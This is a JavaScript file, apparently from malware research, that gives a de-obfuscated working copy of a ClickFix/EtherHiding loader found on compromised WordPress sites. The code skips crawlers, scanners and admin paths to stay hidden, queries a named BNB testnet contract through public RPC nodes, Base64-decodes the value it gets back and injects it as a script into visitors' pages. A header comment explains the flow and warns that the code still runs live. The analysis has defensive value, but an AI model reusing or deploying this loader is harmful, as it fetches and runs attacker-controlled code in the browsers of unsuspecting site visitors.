/*
 * ClickFix / EtherHiding - BSC testnet loader
 *
 * Research Ref:
 * https://research.veryserious.systems/now-boarding-clickfix/
 *
 * The supplied sample is dominated by a custom JavaScript virtual machine.
 * The VM implements its own bytecode format, opcode dispatcher, function
 * wrappers, string decoding, iterators, exception handling and runtime state.
 * The browser-facing payload underneath it is considerably smaller.
 *
 * Page loads
 *     |
 *     +-> Check user agent
 *     |
 *     |   bot / crawler / automation
 *     |       |
 *     |       +-> Stop
 *     |
 *     +-> Check current page/request context
 *     |
 *     |   WordPress administration, API and static-resource paths
 *     |       |
 *     |       +-> Stop
 *     |
 *     +-> Wait for page load
 *     |
 *     +-> Wait approximately one second
 *     |
 *     +-> JSON-RPC eth_call
 *         |
 *         +-> BNB Smart Chain testnet
 *         |
 *         +-> Contract:
 *         |   0xFB448D465841C63F3bC433be61Eb692b813D469d
 *         |
 *         +-> Selector:
 *         |   0x6d4ce63c
 *         |   get()
 *         |
 *         +-> Try public RPC endpoints in sequence
 *             |
 *             +-> bsc-testnet-rpc.publicnode.com
 *             +-> bsc-testnet.bnbchain.org
 *             +-> data-seed-prebsc-1-s1.bnbchain.org:8545
 *             +-> bsc-testnet.drpc.org
 *                 |
 *                 +-> Decode Solidity ABI string
 *                     |
 *                     +-> Base64 decode returned value
 *                         |
 *                         +-> Create inline <script>
 *                             |
 *                             +-> Execute contract-controlled JavaScript
 *
 * The useful network identity is the contract and selector tuple. The RPC
 * hosts are shared public blockchain infrastructure.
 *
 * WARNING:
 * This normalized version preserves the original network and script execution
 * behavior. Running it in a browser can query the live contract and execute
 * JavaScript returned through it.
 *
 * ## Normalized
 */

(() => {
    "use strict";

    const CONTRACT =
        "0xFB448D465841C63F3bC433be61Eb692b813D469d";

    const FUNCTION_SELECTOR = "0x6d4ce63c";

    const BSC_TESTNET_RPC_ENDPOINTS = [
        "https://bsc-testnet-rpc.publicnode.com",
        "https://bsc-testnet.bnbchain.org",
        "http://data-seed-prebsc-1-s1.bnbchain.org:8545",
        "https://bsc-testnet.drpc.org"
    ];

    /*
     * The original VM-protected loader suppresses execution for common
     * crawlers, scanners and command-line clients.
     */
    const BLOCKED_USER_AGENT = new RegExp(
        [
            "bot",
            "crawl",
            "slurp",
            "spider",
            "baidu",
            "ahrefs",
            "mj12bot",
            "semrush",
            "facebookexternalhit",
            "facebot",
            "ia_archiver",
            "yandex",
            "phantomjs",
            "curl",
            "wget",
            "python",
            "java"
        ].join("|"),
        "i"
    );

    /*
     * The loader also avoids WordPress administration/API requests and
     * obvious static-resource paths. This keeps the implant quiet around
     * maintenance traffic, crawlers and resource fetches.
     */
    function shouldSuppressForLocation() {
        const path =
            String(window.location.pathname || "").toLowerCase();

        const wordpressPaths = [
            "/wp-admin",
            "/wp-json",
            "/wp-login.php",
            "/wp-cron.php",
            "/xmlrpc.php",
            "/robots.txt"
        ];

        if (
            wordpressPaths.some((prefix) =>
                path.startsWith(prefix)
            )
        ) {
            return true;
        }

        if (
            path.includes("sitemap") ||
            path.includes("/feed")
        ) {
            return true;
        }

        return /\.(?:css|js|map|json|xml|txt|ico|png|jpe?g|gif|webp|svg|woff2?|ttf|eot|pdf|zip|gz|mp3|mp4|webm)$/i
            .test(path);
    }

    function shouldRun() {
        if (BLOCKED_USER_AGENT.test(navigator.userAgent)) {
            return false;
        }

        if (shouldSuppressForLocation()) {
            return false;
        }

        return true;
    }

    /*
     * Decode the Solidity ABI representation of a dynamic string.
     *
     * eth_call returns:
     *
     *   0x
     *   <32-byte offset>
     *   <32-byte string length>
     *   <string data padded to 32 bytes>
     */
    function decodeAbiString(result) {
        if (
            typeof result !== "string" ||
            !result.startsWith("0x")
        ) {
            return "";
        }

        const hex = result.slice(2);

        if (hex.length < 128) {
            return "";
        }

        const dataOffset =
            Number.parseInt(hex.slice(0, 64), 16) * 2;

        if (!Number.isFinite(dataOffset)) {
            return "";
        }

        const lengthOffset = dataOffset;

        const stringLength =
            Number.parseInt(
                hex.slice(
                    lengthOffset,
                    lengthOffset + 64
                ),
                16
            );

        if (
            !Number.isFinite(stringLength) ||
            stringLength <= 0
        ) {
            return "";
        }

        const dataStart = lengthOffset + 64;

        const encodedString =
            hex.slice(
                dataStart,
                dataStart + stringLength * 2
            );

        let output = "";

        for (
            let offset = 0;
            offset < encodedString.length;
            offset += 2
        ) {
            output += String.fromCharCode(
                Number.parseInt(
                    encodedString.slice(
                        offset,
                        offset + 2
                    ),
                    16
                )
            );
        }

        return output;
    }

    /*
     * Send the eth_call using XMLHttpRequest, matching the transport used by
     * the protected loader.
     */
    function ethCall(rpcUrl) {
        return new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest();

            xhr.open("POST", rpcUrl, true);

            xhr.setRequestHeader(
                "Content-Type",
                "application/json"
            );

            xhr.onload = () => {
                try {
                    const response =
                        JSON.parse(xhr.responseText);

                    if (
                        response &&
                        typeof response.result === "string"
                    ) {
                        resolve(response.result);
                        return;
                    }
                } catch {
                    // Fall through to rejection.
                }

                reject(
                    new Error(
                        "RPC returned no usable result"
                    )
                );
            };

            xhr.onerror = () => {
                reject(
                    new Error("RPC request failed")
                );
            };

            xhr.send(
                JSON.stringify({
                    jsonrpc: "2.0",

                    method: "eth_call",

                    params: [
                        {
                            to: CONTRACT,
                            data: FUNCTION_SELECTOR
                        },
                        "latest"
                    ],

                    id: Math.floor(
                        Math.random() * 0x7fffffff
                    )
                })
            );
        });
    }

    /*
     * Try each public BSC testnet RPC until one returns the contract value.
     */
    async function readContract() {
        for (const rpcUrl of BSC_TESTNET_RPC_ENDPOINTS) {
            try {
                const result =
                    await ethCall(rpcUrl);

                const encodedPayload =
                    decodeAbiString(result);

                if (encodedPayload) {
                    return encodedPayload;
                }
            } catch {
                // Try the next RPC endpoint.
            }
        }

        return "";
    }

    /*
     * The value returned by get() is Base64-encoded JavaScript.
     */
    function decodePayload(encodedPayload) {
        try {
            return atob(encodedPayload);
        } catch {
            return "";
        }
    }

    /*
     * Execute the JavaScript recovered from the contract inside the
     * compromised page.
     */
    function injectPayload(source) {
        if (!source) {
            return;
        }

        const script =
            document.createElement("script");

        script.text = source;

        (document.head || document.body)
            .appendChild(script);
    }

    async function run() {
        const encodedPayload =
            await readContract();

        if (!encodedPayload) {
            return;
        }

        injectPayload(
            decodePayload(encodedPayload)
        );
    }

    if (!shouldRun()) {
        return;
    }

    /*
     * Delay delivery until the document has loaded, then wait approximately
     * one additional second before querying the blockchain.
     */
    function schedule() {
        setTimeout(() => {
            run().catch(() => {});
        }, 1000);
    }

    if (document.readyState === "complete") {
        schedule();
    } else {
        window.addEventListener(
            "load",
            schedule,
            { once: true }
        );
    }
})();
